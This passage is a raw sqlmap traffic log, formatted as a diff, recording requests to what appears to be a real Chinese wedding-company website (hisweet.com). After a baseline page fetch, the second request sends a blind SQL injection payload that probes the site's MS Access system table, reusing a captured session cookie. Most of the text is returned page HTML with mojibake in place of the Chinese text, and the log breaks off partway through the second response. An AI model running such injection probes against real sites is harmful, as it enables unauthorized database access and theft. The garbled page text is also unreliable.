@@ -1,0 +1,1113 @@
+HTTP request [#1]:
+GET /info.asp?id=781 HTTP/1.1
+Accept-language: en-us,en;q=0.5
+Accept-encoding: gzip,deflate
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+User-agent: sqlmap/1.0-dev (http://sqlmap.org)
+Accept-charset: ISO-8859-15,utf-8;q=0.7,*;q=0.7
+Host: www.hisweet.com
+Pragma: no-cache
+Cache-control: no-cache,no-store
+Connection: close
+
+HTTP response [#1] (200 OK):
+Content-length: 18658
+X-powered-by: ASP.NET
+Set-cookie: ASPSESSIONIDQQARRART=GBJMCBPCDIDCAEEINKNBCPAJ; path=/
+Uri: http://www.hisweet.com:80/info.asp?id=781
+Server: Microsoft-IIS/6.0
+Connection: close
+Cache-control: private
+Date: Wed, 04 Dec 2013 09:20:28 GMT
+Content-type: text/html
+
+
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=gb2312" />
+
+<title>���Ѿ�����ϲ���ң���Ҳϲ���� -�Ϸʻ��칫˾��ѡ��������</title>
+<Meta name="Keywords" Content="���Ѿ�����ϲ���ң���Ҳϲ���� ">
+<meta name="description" content="���Ѿ�����ϲ���ң���Ҳϲ���� " />
+<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE7" />
+<link href="css/style.css" rel="stylesheet" type="text/css" />
+<script src="js/swfobject.js" type="text/javascript"></script>
+<script language="javascript" type="text/javascript" src="js/ScrollPic.js"></script>
+<script language="javascript"> 
+//ͼƬ����������,����������趨��ʼ��С
+function resizeimg(ImgD,iwidth,iheight) {
+     var image=new Image();
+     image.src=ImgD.src;
+     if(image.width>0 && image.height>0){
+        if(image.width/image.height>= iwidth/iheight){
+           if(image.width>iwidth){
+               ImgD.width=iwidth;
+               ImgD.height=(image.height*iwidth)/image.width;
+           }else{
+                  ImgD.width=image.width;
+                  ImgD.height=image.height;
+                }
+               ImgD.alt=image.width+"��"+image.height;
+        }
+        else{
+                if(image.height>iheight){
+                       ImgD.height=iheight;
+                       ImgD.width=(image.width*iheight)/image.height;
+                }else{
+                        ImgD.width=image.width;
+                        ImgD.height=image.height;
+                     }
+                ImgD.alt=image.width+"��"+image.height;
+            }
+����������ImgD.style.cursor= "pointer"; //�ı����ָ��
+    }
+}
+</script>
+<style>
+a:hover{ cursor:url('images/tbk.cur'),auto;}
+</style>
+</head>
+<body background="images/bg.jpg">
+<script language="javascript" src="http://qqjs4.user.55.la:81/user_pic/qqjs/2012/01/20/12/236797.js"></script>
+<bgsound src="" loop="-1">
+<div id="top">
+    <div class="logo"><a href="index.asp"><img src="images/logo.jpg" alt="�Ϸʻ��칫˾" border="0" /></a></div>
+    <div class="nav">
+      <div class="nav_01">
+           <a href="tencent://message/?uin=522926867&Site=�Ϸ��������鴴��������޹�˾&Menu=yes" target="_blank"><img src="images/xn.jpg" border="0" /></a><a href="tencent://message/?uin=404491138&Site=�Ϸ��������鴴��������޹�˾&Menu=yes" target="_blank"><img src="images/xm.jpg" border="0" /></a>
+      </div>
+           <div class="nav_02">
+<a href="about.asp?n=gsjj"><img src="images/nav01.jpg" alt="�Ϸʻ��칫˾��������" border="0" /></a>
+<a href="news.asp?lid=1"><img src="images/nav02.jpg" alt="�Ϸʻ��칫˾ʱ����Ѷ" border="0" /></a>
+<a href="news.asp?lid=8"><img src="images/nav03.jpg" alt="�Ϸʻ��칫˾������Ŀ" border="0" /></a>
+<a href="news.asp?lid=7" ><img src="images/nav04.jpg" alt="�Ϸʻ��칫˾�����ײ�" border="0" /></a> 
+          </div>
+           <div class="nav_02">
+<a href="pro.asp?lid=25"><img src="images/nav05.jpg" alt="�Ϸʻ��칫˾�������" border="0" /></a>
+<a href="pro.asp?lid=24"><img src="images/nav06.jpg" alt="�Ϸʻ��칫˾���ʳ���" border="0" /></a>
+<a href="pro.asp?lid=26"><img src="images/nav07.jpg" alt="�Ϸʻ��칫˾���ʿ���" border="0" /></a>
+<a href="about.asp?n=lxwm"><img src="images/nav08.jpg" alt="�Ϸʻ��칫˾��ϵ����" border="0" /></a>      </div>
+    </div>
+</div>
+
+<div class="dy_banner"><SCRIPT src="js/AutoChangePhoto.js" type=text/javascript></SCRIPT>
+<style type="text/css">
+<!--
+.div_xixi {BACKGROUND: #fff; MARGIN: 0px auto; WIDTH:992px; POSITION: relative; HEIGHT: 229px}
+.div_jimg {	MARGIN: 0px; WIDTH: 780px; HEIGHT: 229px}
+.div_jimg #a_jimg {DISPLAY: block; WIDTH:780px; HEIGHT: 229px}
+.div_jimg #bigimg {	BORDER-RIGHT: #fd8383 1px solid; PADDING-RIGHT: 0px; BORDER-TOP: #fd8383 1px solid; PADDING-LEFT: 0px; PADDING-BOTTOM: 0px; MARGIN: 0px; BORDER-LEFT: #fd8383 1px solid; WIDTH:777px; PADDING-TOP: 0px; BORDER-BOTTOM: #fd8383 1px solid; HEIGHT: 227px}
+.div_jimg .ul_jimg {PADDING-RIGHT: 0px; DISPLAY: block; PADDING-LEFT: 0px; RIGHT: 0px; BACKGROUND: url(images/bg_j04.jpg) repeat-y right top; PADDING-BOTTOM: 0px; MARGIN: 0px; WIDTH: 225px; PADDING-TOP: 0px; LIST-STYLE-TYPE: none; POSITION: absolute; TOP: 0px; HEIGHT: 229px}
+.div_jimg .ul_jimg LI {DISPLAY: inline; FLOAT: right; OVERFLOW: hidden; WIDTH: 212px; CURSOR: pointer; WORD-BREAK: break-all; TEXT-INDENT: 30px; padding-top:12px;WHITE-SPACE: nowrap; HEIGHT: 26px; TEXT-OVERFLOW: ellipsis}
+.div_jimg .ul_jimg A {POSITION: relative;color:#93891A;}
+.div_jimg .ul_jimg .on {background-image:url(images/bg_j05.png)!important;background-image:url(#);BACKGROUND: none transparent scroll repeat 0% 0%; FILTER: progid:DXImageTransform.Microsoft.AlphaImageLoader(src='images/bg_j05.png',sizingMethod='scale'); WIDTH: 225px; COLOR: #fff; TEXT-INDENT: 43px; POSITION: static}
+.div_jimg .ul_jimg .on A {FONT-WEIGHT: bold; COLOR: #fff}
+a.img{ font-size:14px; color:#93891A; text-decoration:none;font-weight:700; }
+-->
+</style>
+
+<TABLE id=pictable style="DISPLAY: none">
+  <TBODY>
+  <TR>
+    <TD><IMG src="upimg/20121201236358059.jpg" border=0></TD>
+    <TD>���ʺ�����</TD>
+    <TD>http://www.hisweet.com/info.asp?id=284</TD></TR>
+  <TR>
+    <TD><IMG src="upimg/2012291331033165.jpg" border=0></TD>
+    <TD>���ʾ��¼�</TD>
+    <TD>http://www.hisweet.com/info.asp?id=4</TD></TR>
+  <TR>
+    <TD><IMG src="upimg/20122811515933566.jpg" border=0></TD>
+    <TD>���ʴ��˼�</TD>
+    <TD>http://www.hisweet.com/info.asp?id=3</TD></TR>
+  <TR>
+    <TD><IMG src="upimg/20122817355580534.jpg" border=0></TD>
+    <TD>���������</TD>
+    <TD>http://www.hisweet.com/info.asp?id=2</TD></TR>
+  <TR>
+    <TD><IMG src="upimg/20122817465723602.jpg" border=0></TD>
+    <TD>���ʼ�Լ��</TD>
+    <TD>http://www.hisweet.com/info.asp?id=1</TD></TR>
+<TR>
+    <TD><IMG src="upimg/20122111312746235.jpg" border=0></TD>
+    <TD>һվʽ����</TD>
+    <TD>http://www.hisweet.com/info.asp?id=286</TD></TR></TBODY></TABLE>
+
+<DIV class=div_xixi>
+<SCRIPT language=javascript type=text/javascript>
+<!--
+                var picarry = {};
+                var lnkarry = {};
+                var ttlarry = {};
+                  function FixCode(str){
+                    return str.replace("'","=");
+                  }
+                  var t=document.getElementById("pictable");
+                  var rl=t.rows.length;
+                  var baseu=  document.URL.replace(/(http.*\/)(.*)/, "$1"); 
+                  if(baseu.indexOf("/servlet/")>=0)
+                  baseu = baseu.replace("/servlet/","/");
+
+                  var txt="";
+                  for(var i=0;i<rl;i++){
+                    try{
+                        picarry[i]=t.rows[i].cells[0].childNodes[0].src;
+                        lnkarry[i]=t.rows[i].cells[2].innerHTML;
+                        ttlarry[i]=FixCode(t.rows[i].cells[1].innerHTML);
+                        document.getElementById("li_jimg"+i).innerHTML = '<a href="'+lnkarry[id]+'" target="_blank" class="img"><img src="'+picarry[id]+'" alt=""><\/a>';
+                        alert(picarry[i]);
+                    }catch(e){
+        
+                    }
+                }             
+                    document.write("<div class='div_jimg\'><a class='a_jimg' id='a_jimg' href='"+lnkarry[0]+"' title='' style='background:url("+picarry[1]+")' target='_blank'><img id='bigimg' style='filter:RevealTrans (duration='1',transition='23'); visibility:visible;' alt='' src='"+picarry[0]+"'><\/a><ul class='ul_jimg'><li class='li_jimg on' id='li_jimg0' onmouseover='setfoc(0)' onmouseout='playit()'><a href='"+lnkarry[0]+"' target='_blank' class='img'>"+ttlarry[0]+"<\/a><\/li><li class='li_jimg' id='li_jimg1' onmouseover='setfoc(1)' onmouseout='playit()'><a href='"+lnkarry[1]+"' target='_blank' class='img'>"+ttlarry[1]+"<\/a><\/li><li class='li_jimg' id='li_jimg2' onmouseover='setfoc(2)' onmouseout='playit()'><a href='"+lnkarry[2]+"' target='_blank' class='img'>"+ttlarry[2]+"<\/a><\/li><li class='li_jimg' id='li_jimg3' onmouseover='setfoc(3)' onmouseout='playit()'><a href='"+lnkarry[3]+"' target='_blank' class='img'>"+ttlarry[3]+"<\/a><\/li><li class='li_jimg' id='li_jimg4' onmouseover='setfoc(4)' onmouseout='playit()'><a href='"+lnkarry[4]+"' target='_blank' class='img'>"+ttlarry[4]+"<\/a><\/li><li class='li_jimg' id='li_jimg5' onmouseover='setfoc(5)' onmouseout='playit()'><a href='"+lnkarry[5]+"' target='_blank' class='img'>"+ttlarry[5]+"<\/a><\/li><\/ul><\/div>");
+-->
+</SCRIPT>
+</DIV></div>
+<div class="dy_con">
+  <div class="dy_con_l">
+    <div class="dy_con_l_01"> <span style="float:left;"><img src="images/dy_t01.jpg" /></span> <span style="float:left; width:243px; height:203px; padding-top:11px; background:#9c920a;">
+  
+ <a href="info.asp?id=17" target="_blank" class="dy_01">��ɴ��Ӱ</a>
+ 
+ <a href="info.asp?id=18" target="_blank" class="dy_01">�鳵����</a>
+ 
+ <a href="info.asp?id=19" target="_blank" class="dy_01">��ױ����</a>
+ 
+ <a href="info.asp?id=20" target="_blank" class="dy_01">ʱ�л���</a>
+ 
+ <a href="info.asp?id=21" target="_blank" class="dy_01">�������</a>
+ 
+ <a href="info.asp?id=42" target="_blank" class="dy_01">����ǣ��~</a>
+ 
+ <a href="info.asp?id=43" target="_blank" class="dy_01">��������</a>
+ 
+ <a href="info.asp?id=45" target="_blank" class="dy_01">�������Ư���Ķ������</a>
+ 
+ <a href="info.asp?id=46" target="_blank" class="dy_01">������ױע������</a>
+ 
+ <a href="info.asp?id=47" target="_blank" class="dy_01">�����ļ�����ױ��ע������</a>
+ 
+ <a href="info.asp?id=48" target="_blank" class="dy_01">�����＾��θ�����ˮ</a>
+ 
+ </span></div>
+    <div class="dy_con_l_02"> <span style="float:left;"><img src="images/dy_t02.jpg" /></span> <span style="float:left; width:243px; height:255px; padding-top:15px; background:#9c920a;">
+	 
+      <div class="dy_ti"><a href="info.asp?id=1061" target="_blank" class="dy_02">���ݸ�A1��-Ψ��������ӳ...</a></div>
+  
+      <div class="dy_ti"><a href="info.asp?id=1060" target="_blank" class="dy_02">����ǰ�����������ʲô...</a></div>
+  
+      <div class="dy_ti"><a href="info.asp?id=1059" target="_blank" class="dy_02">����֮��ע������...</a></div>
+  
+      <div class="dy_ti"><a href="info.asp?id=1058" target="_blank" class="dy_02">��������������������ʤ��...</a></div>
+  
+      <div class="dy_ti"><a href="info.asp?id=1057" target="_blank" class="dy_02">��������̨�������е�10����...</a></div>
+  
+      <div class="dy_ti"><a href="info.asp?id=1056" target="_blank" class="dy_02">����"����"���...</a></div>
+  
+      <div class="dy_ti"><a href="info.asp?id=1055" target="_blank" class="dy_02">����֮������� "����"...</a></div>
+  
+      <div class="dy_ti"><a href="info.asp?id=1054" target="_blank" class="dy_02">�����ر��������...</a></div>
+  
+      </span> </div>
+  </div>
+  <div class="dy_con_r_t" style="background:url(images/dya.jpg)"> <span style="float:right; width:240px; height:22px; padding:24px 0px 0px 0px;">���ĵ�ǰλ�ã�<a href="index.asp" class="d">�Ϸʻ�����ҳ</a> >> <a href="news.asp?lid=1" class="d">ʱ����Ѷ</a></span> </div>
+  <div class="dy_con_r_c">
+   <div style="text-align:center; font-size:16px; font-weight:bold; padding-top:20px;">���Ѿ�����ϲ���ң���Ҳϲ���� <hr style="width:98%;" color="#FFFFFF"></div>
+   <div style="text-align:center;">�������ڣ�2013-1-5 9:37:43��������������6268 ��</div>
+   <div class="nei"><script type="text/javascript">document.body.oncopy = function () { setTimeout( function () { var text = clipboardData.getData("text"); if (text) { text = text + "\r\n��ƪ������Դ�� �Ϸ��������鴴����� www.hisweet.com ԭ�����ӣ�"+location.href; clipboardData.setData("text", text); } }, 100 ) }</script>
+<p>
+	<span style="font-size:18px;">����� <strong><em>�Ϸʻ���</em></strong></span><span style="font-size:18px;">�����������Ҿ��ô�Ҷ����������ˣ���ϲ���ң���Ҳϲ���㡣�������Ҿ������ǵġ�����֪���㲻ϲ���ң��Ҿ���ϲ���㣬Ҳ����ϲ�����ˣ�</span><span style="font-size:18px;">���ֿڡ�</span> 
+	<p>
+		<br />
+	</p>
+<span style="font-size:18px;">��</span><span style="font-size:18px;">�� </span> 
+	<p>
+		<br />
+	</p>
+	<p>
+		<br />
+	</p>
+	<p>
+		<span style="font-size:18px;">����� </span><span style="font-size:18px;">�Ϻ��ĺ�ɽ·������·����³ľ����·���Һ�ϲ���ĵ�·��ĳ�վ�����³ľ����·������һ���ֹ�ƤЬ�ꡣ�������С��һ��ͷ�����׵Ĵ��ź��Ƭ�Ĵ�������С���������Ķ���ƤЬ���������죬ï�ܵ���ͩ��ӳ�ĵĽֵ�����ɫ���������档� </span>
+	</p>
+	<p>
+		<br />
+	</p>
+	<p>
+		<span style="font-size:18px;">����� </span><span style="font-size:18px;">�Ҳ��ɵ������ȥ����Щһ˫һ˫�򵥴󷽵�СƤЬ������һ˫��ȥ�ʴ��塣�����������۾�̧ͷ���ң��������еĻ������˵�������ԣ�ϲ�������Կ���� </span>
+	</p>
+	<p>
+		<br />
+	</p>
+	<p>
+		<span style="font-size:18px;">����� </span><span style="font-size:18px;">�����˼�˫�����ڱ���վ�ţ�ͻȻ���ڣ�˵��С����������˫ƤЬ�ǲ�������е�գ���̫���š��Һܾ��ȣ��ǰ���Խ��Խ���ˣ�����ֻ�űȽ�С��� </span>
+	</p>
+	<p>
+		<br />
+	</p>
+	<p>
+		<span style="font-size:18px;">����� </span><span style="font-size:18px;">Ȼ���ҿ���һ˫����˵��ҿ��Ը�����ţƤЬ�棬����������ǳ�������Һܿ��ġ�� </span>
+	</p>
+	<p>
+		<br />
+	</p>
+	<p>
+		<span style="font-size:18px;">����� </span><span style="font-size:18px;">�����¼�ţƤЬ���ʱ���Ҿ���һ�Զ��ţ���һ��ûһ��������죬��˵�Ҫ�Ը�ĸ�ã���Ҳû��˭��ȸ�ĸ����á���˵����Ϊ������У������˵С����Ҫ��Ǯ����Ҫ�һ�����˵���������˷�����������˵û��֮��˵Ҫ����̫�ߡ���Ц�Ǻǵ�˵������û����׷�ң�������Ϊ��Ҫ��ߡ����ܿ϶���˵���ᣬС���ﳤ����Ư�������Ե���ʮ���껹��ôƯ��������Ѿ����ĵ��������㵸�ˡ����������Ь��Ь�����������Ҽ���һֻ���ҽ��ϵ�Ь�ӣ�˵��������·������ܶడ�������ĵĸ�����л��� </span>
+	</p>
+	<p>
+		<span style="padding-left:20px;background:url(images/dian02.gif) no-repeat left center;float:left;"><a class="d" href="info.asp?id=43" target="_blank">��������</a></span>�
+	</p>
+	<div class="lb_con_b">
+		<span style="padding-left:20px;background:url(images/dian02.gif) no-repeat left center;float:left;"><a class="d" href="info.asp?id=42" target="_blank">����ǣ��~</a></span> 
+	</div>
+	<p>
+		<br />
+	</p>
+	<p>
+		<span style="font-size:18px;">����� </span><span style="font-size:18px;">������Ь���Ь����ȥ��վ��ʱ����룬�˰����ƺ�������������Ϊ֪����ϲ���ң��Ҿͻ���ĵ�ϲ���㡣����ֻ��һ��İ���ˡ�Ƽˮ��ꡢ������ڡ�� </span>
+	</p>
+	<p>
+		<br />
+	</p>
+	<p>
+		<span style="font-size:18px;">����� </span><span style="font-size:18px;">����ϲ�����ܶ໹������Ů�˵�ֱ���ϡ�����ֱ�����е����С�� </span>
+	</p>
+	<p>
+		<br />
+	</p>
+	<p>
+		<span style="font-size:18px;">����� </span><span style="font-size:18px;">�ս���ҹ�˾�ĵ�һ�죬��һ�λ��飬�����Ů�����ͱ��˵ķ��ԡ����޼ɵ��ķ����������ҵĵ����и����ң��Ҳ�ϲ������� </span>
+	</p>
+	<p>
+		<br />
+	</p>
+	<p>
+		<span style="font-size:18px;">����� </span><span style="font-size:18px;">�����ͷ��֡��ٺ٣�ԭ����Ҳ��ϲ���ҡ�� </span>
+	</p>
+	<p>
+		<br />
+	</p>
+	<p>
+		<span style="font-size:18px;">����� </span><span style="font-size:18px;">���ܸ����Ĺ���û�н����ĵط���ȴ���ǻ��ܵ�������̡��������룬�������˵�������û������á������ĵ��ﻹ�ǲ���ô���ĵġ�� </span>
+	</p>
+	<p>
+		<br />
+	</p>
+	<p>
+		<span style="font-size:18px;">����� </span><span style="font-size:18px;">��ʵ��һ���Ҿ�֪��Ϊʲô�Ҳ�ϲ�����ˡ���Ϊ��һȺͬ��һ���ȥ�Է���һ����ͣ��԰��·�ߣ�2��������̨���ϣ�2��������̨���¡�һŮ��˵�ϰ忴�����ĳ�����ôͣ�ţ���Ҫ�����ˡ���һ��ͬ�»ص�����������Ů��ͣ�ġ�һ�еĲ��죬�����ҿ��������ǠXX����Ǹ�Ů���������⳵ѽ��� </span>
+	</p>
+	<p>
+		<br />
+	</p>
+	<p>
+		<span style="font-size:18px;">����� </span><span style="font-size:18px;">��һ�գ�ͬ�¾ۼ�һ��˵�XX���������Ϊ��Ҷ�����ѵ��һ�١�����Q����һŮ���죬��̾��XX�̫�����������£�Ӧ�ö�̸̸������ע�����������һ��ٰ��������ظ����㲻֪�������ϰ�Ĺ�ϵô������</span><span style="font-size:18px;">��ס�� </span>
+	</p>
+	<p>
+		<br />
+	</p>
+	<p>
+		<span style="font-size:18px;">���� </span><span style="font-size:18px;">�ӵ�һ�μ����ֱ����ϲ�������������������޵Ĳ�ϲ�������ò���������Ϊ��һ�μ����ӡ�󲻺á����ǣ��Ҳ�ϲ���㣬��Ҳ��ϲ���ҡ�� </span>
+	</p>
+	<p>
+		<br />
+	</p>
+	<p>
+		<span style="font-size:18px;">����� </span><span style="font-size:18px;">����һ�£�����������Ѷ���һ������ģ�һ��ʼ���к�ӡ��Ȼ���ϵԽ��Խ�á�һ�����飬�������ã�����һֱ�������ѡ����Ѳ���̸������������һͷ�ȣ�Ȼ��һ���ȡ����Ѿ�����ϲ���㣬��Ҳϲ���ҡ�� </span>
+	</p>
+	<p>
+		<br />
+	</p>
+	<p>
+		<br />
+	</p></div>
+   
+  </div>
+  <div class="dy_con_r_d"></div>
+</div>
+<div id="foor">
+   <div class="foor_01">
+        <a href="about.asp?n=gsjj" class="d">��������</a> |�
+        <a href="news.asp?lid=1" class="d">ʱ����Ѷ</a> |�
+        <a href="news.asp?lid=8" class="d">������Ŀ</a> |�
+        <a href="news.asp?lid=7" class="d">�����ײ�</a> |�
+        <a href="pro.asp?lid=24" class="d">���ʳ���</a> |�
+        <a href="about.asp?n=lxwm" class="d">��ϵ����</a>
+   </div>
+   <div class="foor_02">
+     <span style="float:left; width:600px; height:22px; padding-left:365px; padding-top:8px;">Copyright � 2007-2012 �Ϸ��������鴴��������޹�˾</span>
+     <span style="float:left; width:600px; height:22px; padding-left:365px;">��ַ������ʡ�Ϸ����ٴ�·�뺬ɽ·��������4F��¥���������鴴�����</span>
+	 <span style="float:left; width:600px; height:22px; padding-left:365px;">�绰��0551��62625238�������䣺NMxinqing@163.com ��<!-- hisweet.com Baidu tongji analytics -->
+<script type="text/javascript">
+var _bdhmProtocol = (("https:" == document.location.protocol) ? " https://" : " http://");
+document.write(unescape("%3Cscript src='" + _bdhmProtocol + "hm.baidu.com/h.js%3F183d55262f38db14ca2b73f42f2d11ec' type='text/javascript'%3E%3C/script%3E"));
+</script>
+<script src="http://s13.cnzz.com/stat.php?id=3795585&web_id=3795585&show=pic" language="JavaScript"></script>
+
+</span>
+   </div>
+</div>
+
+</body>
+</html>
+
+############################################################################
+
+HTTP request [#2]:
+GET /info.asp?id=781%20AND%20ASCW%28MID%28%28SELECT%20IIF%28LEN%28CVAR%28COUNT%28Name%29%29%29=0%2CCHR%2832%29%2CCVAR%28COUNT%28Name%29%29%29%20FROM%20MSysObjects%20WHERE%20Type=1%29%2C1%2C1%29%29%20%3E%2051 HTTP/1.1
+Accept-language: en-us,en;q=0.5
+Accept-encoding: gzip,deflate
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+User-agent: sqlmap/1.0-dev (http://sqlmap.org)
+Accept-charset: ISO-8859-15,utf-8;q=0.7,*;q=0.7
+Host: www.hisweet.com
+Pragma: no-cache
+Cache-control: no-cache,no-store
+Cookie: ASPSESSIONIDQQARRART=GBJMCBPCDIDCAEEINKNBCPAJ
+Connection: close
+
+HTTP response [#2] (200 OK):
+Content-length: 12883
+X-powered-by: ASP.NET
+Uri: http://www.hisweet.com:80/info.asp?id=781%20AND%20ASCW%28MID%28%28SELECT%20IIF%28LEN%28CVAR%28COUNT%28Name%29%29%29=0%2CCHR%2832%29%2CCVAR%28COUNT%28Name%29%29%29%20FROM%20MSysObjects%20WHERE%20Type=1%29%2C1%2C1%29%29%20%3E%2051
+Server: Microsoft-IIS/6.0
+Connection: close
+Cache-control: private
+Date: Wed, 04 Dec 2013 09:20:28 GMT
+Content-type: text/html
+
+
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=gb2312" />
+
+<title>-�Ϸʻ��칫˾��ѡ��������</title>
+<Meta name="Keywords" Content="">
+<meta name="description" content="" />
+<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE7" />
+<link href="css/style.css" rel="stylesheet" type="text/css" />
+<script src="js/swfobject.js" type="text/javascript"></script>
+<script language="javascript" type="text/javascript" src="js/ScrollPic.js"></script>
+<script language="javascript"> 
+//ͼƬ����������,����������趨��ʼ��С
+function resizeimg(ImgD,iwidth,iheight) {
+     var image=new Image();
+     image.src=ImgD.src;
+     if(image.width>0 && image.height>0){
+        if(image.width/image.height>= iwidth/iheight){
+           if(image.width>iwidth){
+               ImgD.width=iwidth;
+               ImgD.height=(image.height*iwidth)/image.width;
+           }else{
+                  ImgD.width=image.width;
+                  ImgD.height=image.height;
+                }
+               ImgD.alt=image.width+"��"+image.height;
+        }
+        else{
+                if(image.height>iheight){
+                       ImgD.height=iheight;
+                       ImgD.width=(image.width*iheight)/image.height;
+                }else{
+                        ImgD.width=image.width;
+                        ImgD.height=image.height;
+                     }
+                ImgD.alt=image.width+"��"+image.height;
+            }
+����������ImgD.style.cursor= "pointer"; //�ı����ָ��
+    }
+}
+</script>
+<style>
+a:hover{ cursor:url('images/tbk.cur'),auto;}
+</style>
+</head>
+<body background="images/bg.jpg">
+<script language="javascript" src="http://qqjs4.user.55.la:81/user_pic/qqjs/2012/01/20/12/236797.js"></script>
+<bgsound src="" loop="-1">
+<div id="top">
+    <div class="logo"><a href="index.asp"><img src="images/logo.jpg" alt="�Ϸʻ��칫˾" border="0" /></a></div>
+    <div class="nav">
+      <div class="nav_01">
+           <a href="tencent://message/?uin=522926867&Site=�Ϸ��������鴴��������޹�˾&Menu=yes" target="_blank"><img src="images/xn.jpg" border="0" /></a><a href="tencent://message/?uin=404491138&Site=�Ϸ��������鴴��������޹�˾&Menu=yes" target="_blank"><img src="images/xm.jpg" border="0" /></a>
+      </div>
+           <div class="nav_02">
+<a href="about.asp?n=gsjj"><img src="images/nav01.jpg" alt="�Ϸʻ��칫˾��������" border="0" /></a>
+<a href="news.asp?lid=1"><img src="images/nav02.jpg" alt="�Ϸʻ��칫˾ʱ����Ѷ" border="0" /></a>
+<a href="news.asp?lid=8"><img src="images/nav03.jpg" alt="�Ϸʻ��칫˾������Ŀ" border="0" /></a>
+<a href="news.asp?lid=7" ><img src="images/nav04.jpg" alt="�Ϸʻ��칫˾�����ײ�" border="0" /></a> 
+          </div>
+           <div class="nav_02">
+<a href="pro.asp?lid=25"><img src="images/nav05.jpg" alt="�Ϸʻ��칫˾�������" border="0" /></a>
+<a href="pro.asp?lid=24"><img src="images/nav06.jpg" alt="�Ϸʻ��칫˾���ʳ���" border="0" /></a>
+<a href="pro.asp?lid=26"><img src="images/nav07.jpg" alt="�Ϸʻ��칫˾���ʿ���" border="0" /></a>
+<a href="about.asp?n=lxwm"><img src="images/nav08.jpg" alt="�Ϸʻ��칫˾��ϵ����" border="0" /></a>      </div>
+    </div>
+</div>
+
+<div class="dy_banner"><SCRIPT src="js/AutoChangePhoto.js" type=text/javascript></SCRIPT>
+<style type="text/css">
+<!--
+.div_xixi {BACKGROUND: #fff; MARGIN: 0px auto; WIDTH:992px; POSITION: relative; HEIGHT: 229px}
+.div_jimg {	MARGIN: 0px; WIDTH: 780px; HEIGHT: 229px}
+.div_jimg #a_jimg {DISPLAY: block; WIDTH:780px; HEIGHT: 229px}
+.div_jimg #bigimg {	BORDER-RIGHT: #fd8383 1px solid; PADDING-RIGHT: 0px; BORDER-TOP: #fd8383 1px solid; PADDING-LEFT: 0px; PADDING-BOTTOM: 0px; MARGIN: 0px; BORDER-LEFT: #fd8383 1px solid; WIDTH:777px; PADDING-TOP: 0px; BORDER-BOTTOM: #fd8383 1px solid; HEIGHT: 227px}
+.div_jimg .ul_jimg {PADDING-RIGHT: 0px; DISPLAY: block; PADDING-LEFT: 0px; RIGHT: 0px; BACKGROUND: url(images/bg_j04.jpg) repeat-y right top; PADDING-BOTTOM: 0px; MARGIN: 0px; WIDTH: 225px; PADDING-TOP: 0px; LIST-STYLE-TYPE: none; POSITION: absolute; TOP: 0px; HEIGHT: 229px}
+.div_jimg .ul_jimg LI {DISPLAY: inline; FLOAT: right; OVERFLOW: hidden; WIDTH: 212px; CURSOR: pointer; WORD-BREAK: break-all; TEXT-INDENT: 30px; padding-top:12px;WHITE-SPACE: nowrap; HEIGHT: 26px; TEXT-OVERFLOW: ellipsis}
+.div_jimg .ul_jimg A {POSITION: relative;color:#93891A;}
+.div_jimg .ul_jimg .on {background-image:url(images/bg_j05.png)!important;background-image:url(#);BACKGROUND: none transparent scroll repeat 0% 0%; FILTER: progid:DXImageTransform.Microsoft.AlphaImageLoader(src='images/bg_j05.png',sizingMethod='scale'); WIDTH: 225px; COLOR: #fff; TEXT-INDENT: 43px; POSITION: static}
+.div_jimg .ul_jimg .on A {FONT-WEIGHT: bold; COLOR: #fff}
+a.img{ font-size:14px; color:#93891A; text-decoration:none;font-weight:700; }
+-->
+</style>
+
+<TABLE id=pictable style="DISPLAY: none">
+  <TBODY>
+  <TR>
+    <TD><IMG src="upimg/20121201236358059.jpg" border=0></TD>
+    <TD>���ʺ�����</TD>
+    <TD>http://www.hisweet.com/info.asp?id=284</TD></TR>
+  <TR>
+    <TD><IMG src="upimg/2012291331033165.jpg" border=0></TD>
+    <TD>���ʾ��¼�</TD>
+    <TD>http://www.hisweet.com/info.asp?id=4</TD></TR>
+  <TR>
+    <TD><IMG src="upimg/20122811515933566.jpg" border=0></TD>
+    <TD>���ʴ��˼�</TD>
+    <TD>http://www.hisweet.com/info.asp?id=3</TD></TR>
+  <TR>
+    <TD><IMG src="upimg/20122817355580534.jpg" border=0></TD>
+    <TD>���������</TD>
+    <TD>http://www.hisweet.com/info.asp?id=2</TD></TR>
+  <TR>
+    <TD><IMG src="upimg/20122817465723602.jpg" border=0></TD>
+    <TD>���ʼ�Լ��</TD>
+    <TD>http://www.hisweet.com/info.asp?id=1</TD></TR>
+<TR>
+    <TD><IMG src="upimg/20122111312746235.jpg" border=0></TD>
+    <TD>һվʽ����</TD>
+    <TD>http://www.hisweet.com/info.asp?id=286</TD></TR></TBODY></TABLE>
+
+<DIV class=div_xixi>
+<SCRIPT language=javascript type=text/javascript>
+<!--
+                var picarry = {};
+                var lnkarry = {};
+                var ttlarry = {};
+                  function FixCode(str){
+                    return str.replace("'","=");
+                  }
+                  var t=document.getElementById("pictable");
+                  var rl=t.rows.length;
+                  var baseu=  document.URL.replace(/(http.*\/)(.*)/, "$1"); 
+                  if(baseu.indexOf("/servlet/")>=0)
+                  baseu = baseu.replace("/servlet/","/");
+
+                  var txt="";
+                  for(var i=0;i<rl;i++){
+                    try{
+                        picarry[i]=t.rows[i].cells[0].childNodes[0].src;
+                        lnkarry[i]=t.rows[i].cells[2].innerHTML;
+                        ttlarry[i]=FixCode(t.rows[i].cells[1].innerHTML);
+                        document.getElementById("li_jimg"+i).innerHTML = '<a href="'+lnkarry[id]+'" target="_blank" class="img"><img src="'+picarry[id]+'" alt=""><\/a>';
+                        alert(picarry[i]);
+                    }catch(e){
+        
+                    }
+                }             
